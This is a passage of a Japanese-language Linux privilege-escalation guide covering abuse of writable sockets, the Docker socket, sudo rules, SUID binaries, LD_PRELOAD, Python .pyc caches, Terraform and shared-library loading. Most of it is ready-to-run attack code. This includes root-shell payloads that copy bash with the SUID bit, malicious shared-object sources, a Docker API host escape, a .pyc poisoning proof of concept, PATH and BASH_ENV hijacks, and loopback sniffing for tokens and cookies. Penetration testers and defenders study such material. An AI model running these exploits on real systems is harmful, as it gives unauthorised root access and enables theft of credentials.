### Socket activation + writable unit path (create missing service)

もう 1 つの high-impact な misconfiguration は次のとおりです。

- `Accept=no` と `Service=<name>.service` を持つ socket unit
- 参照されている service unit が存在しない
- attacker が `/etc/systemd/system`（または別の unit search path）に write できる

この場合、attacker は `<name>.service` を作成し、その後 socket への traffic を trigger できます。すると systemd が新しい service を root として load して execute します。

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 書き込み可能なソケット

**書き込み可能なソケットを特定した場合**（ここで扱っているのは Unix Sockets であり、設定用の `.socket` ファイルではありません）、そのソケットと**通信できる**ため、脆弱性を悪用できる可能性があります。

### Unix Sockets の列挙
```bash
netstat -a -p --unix
```
### Raw connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation の例:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP ソケット

**HTTP** リクエストを**待ち受けているソケット**が存在する場合があります（ここで言っているのは `.socket` ファイルではなく、Unix ソケットとして機能するファイルです）。次のコマンドで確認できます：
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
ソケットが **HTTP リクエストに応答**する場合、そのソケットと **通信**でき、場合によっては **脆弱性を exploit** できる可能性があります。

### Writable Docker Socket

Docker ソケットは、通常 `/var/run/docker.sock` にあり、保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込みアクセス権を持つと、権限昇格につながる可能性があります。ここでは、その方法と、Docker CLI が利用できない場合の代替手法について説明します。

#### **Docker CLI による権限昇格**

Docker ソケットへの書き込みアクセス権がある場合、以下のコマンドを使用して権限昇格できます:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使用すると、ホストのファイルシステムに root-level access でコンテナを実行できます。

#### **Docker API を直接使用**

Docker CLI が利用できない場合でも、Unix socket 上で raw HTTP を使用すれば、Docker socket を abuse できます。最も信頼性の高い flow は次のとおりです。

- host root を bind-mount した long-lived helper container を作成する
- それを start する
- その helper 内に `exec` instance を作成する
- `exec` instance を start し、API 経由で output を読み取る

**Docker images の一覧表示**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**ヘルパーコンテナを作成して起動する**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**exec instanceを作成**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**exec instanceを起動し、出力を読み取る**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
このパターンは、`attach` を `socat` や `nc -U` で手動操作しようとするより、通常は堅牢です。`/:/host` を使って helper を作成できれば、追加の `exec` インスタンスを使用して `/host/root/...` などのファイルを読み取ったり、`/host/root/.ssh` に SSH keys を追加したり、host の startup files を変更したりできます。

### Others

**グループ `docker` の内部にいる**ために docker socket への write permissions がある場合、[**privilege escalation の方法がさらにあります**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。[**docker API が port で listen している**場合は、それを compromise することもできます](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**containers から break out したり、container runtimes を abuse して privilege escalation したりする方法**については、以下を確認してください:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

**`ctr`** command を使用できることがわかった場合は、以下のページを読んでください。**これを abuse して privilege escalation できる可能性があります**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

**`runc`** command を使用できることがわかった場合は、以下のページを読んでください。**これを abuse して privilege escalation できる可能性があります**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、applications が効率的に interact して data を共有できる高度な **inter-Process Communication (IPC) system** です。現代の Linux system を念頭に設計されており、さまざまな形式の application communication に対応する堅牢な framework を提供します。

この system は versatile で、process 間の data exchange を強化する basic IPC をサポートしており、**enhanced UNIX domain sockets** を想起させます。また、events や signals の broadcast にも対応し、system components 間の seamless な integration を実現します。たとえば、Bluetooth daemon から incoming call があることを知らせる signal によって music player が mute され、user experience が向上します。さらに、D-Bus は remote object system をサポートしており、applications 間の service requests や method invocations を簡略化し、従来は複雑だった processes を効率化します。

D-Bus は **allow/deny model** で動作し、matching policy rules の累積効果に基づいて message permissions（method calls、signal emissions など）を管理します。これらの policies は bus との interactions を指定するため、permissions を exploit することで privilege escalation につながる可能性があります。

このような policy の例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` があり、root user が `fi.w1.wpa_supplicant1` の messages を own、send、receive するための permissions が記述されています。

user または group が指定されていない policies は universal に適用されます。一方、"default" context policies は、他の specific policies の対象になっていないすべての対象に適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus communication の列挙と exploit の方法はこちら：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙して、マシンの位置を把握することは常に興味深い作業です。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering の簡易トリアージ

ホスト上でコマンドを実行できるものの callbacks に失敗する場合は、DNS、transport、proxy、route filtering を迅速に切り分けます：
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 開いているポート

アクセスする前に、これまで対話できなかったマシン上で実行されているネットワークサービスを必ず確認します。
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
バインド先に基づいて listener を分類します。

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されています。
- `127.0.0.1` / `::1`: ローカルのみ（tunnel/forward の候補として適しています）。
- 特定の内部 IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常、内部セグメントからのみ到達可能です。

### Local-only service triage workflow

ホストを compromise すると、`127.0.0.1` にバインドされた services が、shell から初めて到達可能になることがよくあります。簡単なローカルワークフローは次のとおりです。
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS を network scanner として使用（network-only mode）

ローカル PE チェックに加えて、linPEAS は対象をネットワークに絞った scanner として実行できます。利用可能な `$PATH` 内のバイナリ（通常は `fping`、`ping`、`nc`、`ncat`）を使用し、tooling はインストールしません。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-t` なしで `-d`、`-p`、または `-i` を指定すると、linPEAS は純粋な network scanner として動作します（その他の privilege-escalation チェックはスキップされます）。

### Sniffing

traffic を sniff できるか確認します。可能であれば、credentials を取得できる場合があります。
```
timeout 1 tcpdump
```
簡単な実践チェック：
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) は post-exploitation で特に価値があります。多くの内部専用サービスが、そこに token/cookie/credential を公開しているためです:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
今すぐキャプチャし、後で解析する:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## ユーザー

### Generic Enumeration

自分が**誰**なのか、どのような**権限**を持っているのか、システム上にどのような**ユーザー**が存在するのか、どのユーザーが**ログイン**でき、どのユーザーが**root 権限**を持っているのかを確認します：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できる bug の影響を受けました。詳細は [こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、[こちら](https://twitter.com/paragonsec/status/1071152249529884674)。\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root 権限を付与する可能性のある **group** の**メンバー**になっていないか確認します:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

（可能であれば）clipboard 内に興味深いものがないか確認します
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

環境の**いずれかの password を知っている**場合、その password を使って**各 user として login**を試してください。

### Su Brute

大量の noise が発生しても問題なく、`su` と `timeout` の binary がコンピューター上に存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使って user の brute-force を試せます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も、`-a` parameter を指定すると user の brute-force を試します。

## Writable PATH abuses

### $PATH

**$PATH 内のいずれかの folder に write できる**場合、**writable folder 内に backdoor を作成**することで privilege を escalate できる可能性があります。その backdoor の名前には、別の user（理想的には root）が実行する command の名前を使用します。また、その command は $PATH 内で writable folder より**前に位置する folder から load されない**必要があります。

### SUDO and SUID

sudo を使って command を実行できる場合や、command に suid bit が設定されている場合があります。次のコマンドで確認してください】【。
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**予期しないコマンドを使用すると、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能です。** 例:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration により、ユーザーがパスワードを知らなくても、別のユーザーの権限で一部のコマンドを実行できる場合があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `root` として `vim` を実行できます。そのため、root ディレクトリに ssh key を追加するか、`sh` を呼び出すだけで簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブを使用すると、何かを実行する際に**環境変数を設定**できます。
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer に基づくもので**、root としてスクリプトを実行する際に任意の Python library を読み込む **PYTHONPATH hijacking** に対して**脆弱**でした。
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-allowed Python imports における書き込み可能な `__pycache__` / `.pyc` poisoning

**sudo-allowed Python script** が、package directory に **書き込み可能な `__pycache__`** を含む module を import している場合、cached `.pyc` を置き換え、次回の import 時に privileged user として code execution を取得できる可能性があります。

- 動作する理由:
- CPython は bytecode cache を `__pycache__/module.cpython-<ver>.pyc` に保存します。
- interpreter は **header**（magic + source に関連付けられた timestamp/hash metadata）を検証し、その後に保存されている marshaled code object を実行します。
- directory に書き込み可能で cached file を **delete and recreate** できる場合、root-owned で書き込み不可の `.pyc` でも置き換えられます。
- 典型的な path:
- `sudo -l` に、root として実行可能な Python script または wrapper が表示される。
- その script が `/opt/app/`、`/usr/local/lib/...` などから local module を import する。
- import された module の `__pycache__` directory が user または全員に対して writable である。

簡易 enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
特権スクリプトを検査できる場合は、import されたモジュールとそのキャッシュパスを特定します。
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. sudo-allowed scriptを1回実行し、存在しない場合はPythonに正規のcache fileを作成させる。
2. 正規の`.pyc`から最初の16バイトを読み取り、poisoned fileで再利用する。
3. payloadのcode objectをコンパイルして`marshal.dumps(...)`し、元のcache fileを削除した後、元のheaderと悪意のあるbytecodeを結合して再作成する。
4. sudo-allowed scriptを再実行し、rootとしてimport時にpayloadを実行させる。

Important notes:

- 元のheaderを再利用することが重要。Pythonはbytecode本体がsourceと実際に一致するかではなく、cache metadataとsource fileの照合を行うため。
- これは、source fileがroot所有で書き込み不可でも、格納先の`__pycache__` directoryが書き込み可能な場合に特に有効。
- 特権プロセスが`PYTHONDONTWRITEBYTECODE=1`を使用している場合、safe permissionsのlocationからimportしている場合、またはimport path内のすべてのdirectoryへの書き込み権限を削除している場合、攻撃は失敗する。

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- 低権限ユーザーが、`__pycache__` を含む privileged Python import path 内のどのディレクトリにも書き込めないようにする。
- privileged な実行では、`PYTHONDONTWRITEBYTECODE=1` の使用と、予期しない書き込み可能な `__pycache__` ディレクトリを定期的にチェックすることを検討する。
- 書き込み可能なローカル Python モジュールや書き込み可能な cache ディレクトリは、root によって実行される書き込み可能な shell script や shared library と同じように扱う。

### sudo env_keep によって保持される BASH_ENV → root shell

sudoers が `BASH_ENV`（例: `Defaults env_keep+="ENV BASH_ENV"`）を保持する場合、Bash の non-interactive startup behavior を利用して、許可された command の実行時に root として任意の code を実行できる。

- 動作する理由: non-interactive shell では、Bash は対象の script を実行する前に `$BASH_ENV` を評価し、その file を source する。多くの sudo rule では、script や shell wrapper の実行が許可されている。`BASH_ENV` が sudo によって保持される場合、その file は root privileges で source される。

- Requirements:
- 実行可能な sudo rule（`/bin/bash` を non-interactively 呼び出す target、または bash script）。
- `env_keep` に `BASH_ENV` が存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を優先する。
- sudo で許可されたコマンドに対する shell wrapper を避け、最小限のバイナリを使用する。
- 保持された環境変数が使用された場合に備え、sudo の I/O logging と alerting を検討する。

### sudo 経由の Terraform と保持された HOME（!env_reset）

sudo が環境をそのまま保持する（`!env_reset`）一方で、`terraform apply` の実行を許可している場合、`$HOME` は呼び出し元ユーザーのままになる。そのため、Terraform は root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` を適用する。

- 必要な provider を writable directory に指定し、その provider 名にちなんだ名前（例：`terraform-provider-examples`）の malicious plugin を配置する：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root として実行し、SUID shell を残します。

### TF_VAR overrides + symlink validation bypass

Terraform の変数は `TF_VAR_<name>` 環境変数を介して指定できます。これらは sudo が環境変数を保持すると、そのまま残ります。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような脆弱な validation は、シンボリックリンクを使って bypass できます。
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform は symlink を解決し、実際の `/root/root.txt` を attacker が読み取り可能な保存先へコピーします。同じ手法を使用して、あらかじめ保存先に symlink を作成することで、privileged なパスへ **書き込む** こともできます（例：provider の保存先パスを `/etc/cron.d/` 内に指す）。

### requiretty / !requiretty

一部の古い distribution では、sudo に `requiretty` を設定でき、sudo を対話型 TTY からのみ実行できるよう強制します。`!requiretty` が設定されている場合（またはこのオプションが存在しない場合）、reverse shell、cron job、script などの non-interactive な context から sudo を実行できます。
```bash
Defaults !requiretty
```
これはそれ自体が直接的な脆弱性ではありませんが、完全な PTY を必要とせずに sudo ルールを悪用できる状況を広げます。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH`、または攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）を含む `secure_path` が表示される場合、sudo で許可された対象内にある相対パスのコマンドを、同名の別コマンドで shadow できます。

- Requirements: 絶対パスを使用せずにコマンド（`free`、`df`、`ps` など）を呼び出すスクリプトまたはバイナリを実行する sudo ルール（多くの場合 `NOPASSWD`）と、最初に検索される書き込み可能な PATH エントリ。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### パスをバイパスする Sudo 実行
**Jump** で他のファイルを読み取ったり、**symlinks** を使用したりします。たとえば sudoers file では: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**wildcard** が使用されている場合（\*）、さらに簡単です：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary（command path なし）

**sudo permission** が単一の command に対して **path を指定せずに**与えられている場合: _hacker10 ALL= (root) less_、PATH variable を変更することで exploit できます
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この technique は、**suid** binary が **path を指定せずに別の command を実行する場合にも使用できます（常に** _**strings**_ **を使って、奇妙な SUID binary の content を確認してください）**。

[実行する Payload の例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### command path を指定する SUID binary

**suid** binary が **path を指定して別の command を実行する場合**、その suid file が呼び出している command と同じ名前の **function を export** してみることができます。

例えば、suid binary が _**/usr/sbin/service apache2 start**_ を呼び出す場合、function を作成して export してみる必要があります：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then、SUID binaryを呼び出すと、この関数が実行されます

### SUID wrapperによって実行される書き込み可能なscript

一般的なcustom-appの設定ミスは、root所有のSUID binary wrapperがscriptを実行する一方で、そのscript自体がlow-priv userによって書き込み可能になっていることです。

典型的なパターン:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh` が書き込み可能な場合、payload コマンドを追記してから SUID wrapper を実行できます:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
簡単なチェック:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
この攻撃経路は、`/usr/local/bin` に配置された「maintenance」/「backup」wrapper で特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable は、標準 C library（`libc.so`）を含む他のすべての library より先に loader が読み込む、1 つ以上の shared library（.so files）を指定するために使用されます。この process は library の preloading と呼ばれます。

ただし、system security を維持し、この feature が悪用されるのを防ぐため、特に **suid/sgid** executables に対して、system は以下の条件を適用します。

- real user ID（_ruid_）が effective user ID（_euid_）と一致しない executable では、loader は **LD_PRELOAD** を無視します。
- suid/sgid を持つ executable では、standard paths にあり、かつ suid/sgid でもある library のみが preload されます。

`sudo` を使用して commands を実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という statement が含まれている場合、privilege escalation が発生する可能性があります。この configuration により、`sudo` で commands を実行した場合でも **LD_PRELOAD** environment variable が維持され認識されるため、elevated privileges で arbitrary code が実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存してください。
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、以下を使用して**コンパイルします**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**権限を昇格**して実行する
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合、同様の privesc が悪用される可能性があります。これは、libraries が検索される path を制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** permissionsを持つ、通常とは異なるように見えるbinaryに遭遇した場合、**.so** filesが適切にloadされているか確認するのがよいでしょう。これは、次のcommandを実行して確認できます。
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_“open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)”_ のようなエラーに遭遇した場合、exploit の可能性があることを示しています。

これを exploit するには、まず _"/path/to/.config/libcalc.c"_ などの C ファイルを作成し、そこに次のコードを記述します。
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限で shell を実行することで privilege を昇格させることを目的としています。

上記の C ファイルを、以下のコマンドで shared object（.so）ファイルにコンパイルします：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最終的に、影響を受ける SUID binary を実行すると exploit が発動し、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダから library をロードしている SUID binary が見つかったので、必要な名前でそのフォルダに library を作成しましょう。
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成した library には `a_function_name` という名前の function が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリをまとめたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同じものですが、command に **引数のみを inject できる**場合を対象としています。

この project では、restricted shell から脱出したり、権限を escalate または維持したり、files を transfer したり、bind shell や reverse shell を spawn したり、その他の post-exploitation tasks を容易にしたりするために悪用できる、Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合は、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、sudo rule を exploit する方法が見つかるか確認できます。

### Sudo Tokens の再利用

**sudo access** はあるものの password がない場合、**sudo command の実行を待機してから session token を hijack する**ことで privileges を escalate できます。

Privileges を escalate するための要件:

- user "_sampleuser_" としてすでに shell を取得している
- "_sampleuser_" が **過去 15 分以内に `sudo` を使用している**（デフォルトでは、これは sudo token の有効期間であり、password を入力せずに `sudo` を使用できます）
- `cat /proc/sys/kernel/yama/ptrace_scope` の値が 0
- `gdb` にアクセスできる（upload できる状態）

